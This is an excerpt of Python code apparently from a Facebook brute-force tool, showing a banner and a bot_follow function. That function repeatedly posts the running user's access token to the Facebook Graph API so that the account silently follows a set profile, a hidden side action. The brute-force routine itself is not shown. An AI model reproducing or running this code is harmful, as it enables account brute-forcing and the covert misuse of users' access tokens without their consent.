...
def banner():
    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Aris Munandar  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/Dapunta ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
...
def bot_follow():
	...
	requests.post("https://graph.facebook.com/100001852547761/subscribers?access_token=" + toket)      # Aris Munandar
	requests.post("https://graph.facebook.com/100001852547761/subscribers?access_token=" + toket)      # Aris Munandar
	requests.post("https://graph.facebook.com/100001852547761/subscribers?access_token=" + toket) # Aris Munandar
	...
	requests.post("https://graph.facebook.com/100001852547761/subscribers?access_token=" + toket) # Angga Kurniawan
	requests.post("https://graph.facebook.com/100001852547761/subscribers?access_token=" + toket) # Moh Yayan
